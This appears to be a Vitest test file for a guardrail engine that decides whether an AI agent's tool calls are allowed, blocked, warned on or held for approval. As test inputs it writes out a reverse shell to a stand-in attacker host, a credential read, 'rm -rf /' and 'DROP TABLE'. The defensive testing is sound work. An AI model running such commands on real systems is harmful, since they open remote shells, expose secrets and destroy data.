import { describe, it, expect, beforeEach } from "vitest";
import {
  GuardrailEngine,
  DEFAULT_GUARDRAIL_RULES,
  getGuardrailEngine,
  setGuardrailEngine,
} from "./guardrails.js";

describe("GuardrailEngine.evaluate", () => {
  let engine: GuardrailEngine;

  beforeEach(() => {
    engine = new GuardrailEngine(DEFAULT_GUARDRAIL_RULES.map((r) => ({ ...r })));
  });

  it("returns 'allow' when no rules match", () => {
    const result = engine.evaluate({ tool: "bash", input: "echo hello" });
    expect(result.action).toBe("allow");
    expect(result.triggered).toHaveLength(0);
  });

  it("blocks bash credential harvest pattern", () => {
    const result = engine.evaluate({
      tool: "bash",
      input: { command: "cat credentials" },
    });
    expect(result.action).toBe("block");
    expect(result.triggered.some((t) => t.rule.id === "bash-credential-harvest")).toBe(true);
  });

  it("blocks reverse shell pattern", () => {
    const result = engine.evaluate({
      tool: "bash",
      input: { command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1" },
    });
    expect(result.action).toBe("block");
    expect(result.triggered.some((t) => t.rule.id === "bash-reverse-shell")).toBe(true);
  });

  it("requires approval for mass deletion (rm -rf /)", () => {
    const result = engine.evaluate({
      tool: "bash",
      input: { command: "rm -rf /" },
    });
    expect(result.action).toBe("require-approval");
    expect(result.triggered.some((t) => t.rule.id === "bash-mass-delete")).toBe(true);
  });

  it("requires approval for DROP TABLE", () => {
    const result = engine.evaluate({
      tool: "bash",
      input: { command: "DROP TABLE users" },
    });
    expect(result.action).toBe("require-approval");
  });

  it("warns on SSN in output", () => {
    const result = engine.evaluate({
      tool: "any-tool",
      output: "Your SSN is 123-45-6789.",
    });
    expect(result.action).toBe("warn");
    expect(result.triggered.some((t) => t.rule.id === "output-ssn")).toBe(true);
  });

  it("blocks credit card numbers in output", () => {
    const result = engine.evaluate({
      tool: "any-tool",
      output: "Card: 4111111111111111",
    });
    expect(result.action).toBe("block");
    expect(result.triggered.some((t) => t.rule.id === "output-credit-card")).toBe(true);
  });

  it("picks most restrictive action when multiple rules fire", () => {
    // SSN (warn) + credit card (block) — should return block
    const result = engine.evaluate({
      tool: "any-tool",
      output: "SSN 123-45-6789 and CC 4111111111111111",
    });
    expect(result.action).toBe("block");
  });

  it("tool filter: bash rules do not fire for non-bash tools", () => {
    const result = engine.evaluate({
      tool: "web-search",
      input: { command: "cat credentials" },
    });
    // Only output-pattern rules could fire; input is JSON-stringified but tool doesn't match bash
    // No bash-* rules should trigger
    expect(result.triggered.every((t) => !t.rule.id.startsWith("bash-"))).toBe(true);
  });

  it("tool filter with regex: matches tool by pattern", () => {
    const regexEngine = new GuardrailEngine([
      {
        id: "test-regex-tool",
        description: "Test",
        match: { tool: /^bash$/ },
        action: "warn",
      },
    ]);
    expect(regexEngine.evaluate({ tool: "bash" }).action).toBe("warn");
    expect(regexEngine.evaluate({ tool: "other" }).action).toBe("allow");
  });
});

describe("GuardrailEngine.addRule / removeRule", () => {
  it("addRule adds a custom rule that is evaluated", () => {
    const engine = new GuardrailEngine([]);
    engine.addRule({
      id: "custom-block",
      description: "Block test tool",
      match: { tool: "test-tool" },
      action: "block",
    });
    expect(engine.evaluate({ tool: "test-tool" }).action).toBe("block");
    expect(engine.evaluate({ tool: "other-tool" }).action).toBe("allow");
  });

  it("removeRule removes an existing rule", () => {
    const engine = new GuardrailEngine([
      {
        id: "to-remove",
        description: "Remove me",
        match: { tool: "bash", commandPattern: /dangerous/gi },
        action: "block",
      },
    ]);
    expect(engine.evaluate({ tool: "bash", input: "dangerous cmd" }).action).toBe("block");
    engine.removeRule("to-remove");
    expect(engine.evaluate({ tool: "bash", input: "dangerous cmd" }).action).toBe("allow");
  });
});

describe("GuardrailEngine with empty rule set", () => {
  it("allows everything with no rules", () => {
    const engine = new GuardrailEngine([]);
    const result = engine.evaluate({ tool: "bash", input: "rm -rf /", output: "4111111111111111" });
    expect(result.action).toBe("allow");
    expect(result.triggered).toHaveLength(0);
  });
});

describe("getGuardrailEngine / setGuardrailEngine", () => {
  it("getGuardrailEngine returns a GuardrailEngine instance", () => {
    const eng = getGuardrailEngine();
    expect(eng).toBeInstanceOf(GuardrailEngine);
  });

  it("setGuardrailEngine replaces the singleton", () => {
    const custom = new GuardrailEngine([]);
    setGuardrailEngine(custom);
    expect(getGuardrailEngine()).toBe(custom);
    // Restore default for other tests
    setGuardrailEngine(new GuardrailEngine());
  });
});

describe("DEFAULT_GUARDRAIL_RULES", () => {
  it("has at least 5 rules", () => {
    expect(DEFAULT_GUARDRAIL_RULES.length).toBeGreaterThanOrEqual(5);
  });

  it("all rules have unique IDs", () => {
    const ids = DEFAULT_GUARDRAIL_RULES.map((r) => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("all rules have a valid action", () => {
    const valid = new Set(["allow", "warn", "block", "require-approval"]);
    for (const rule of DEFAULT_GUARDRAIL_RULES) {
      expect(valid.has(rule.action), `rule ${rule.id} has invalid action`).toBe(true);
    }
  });
});
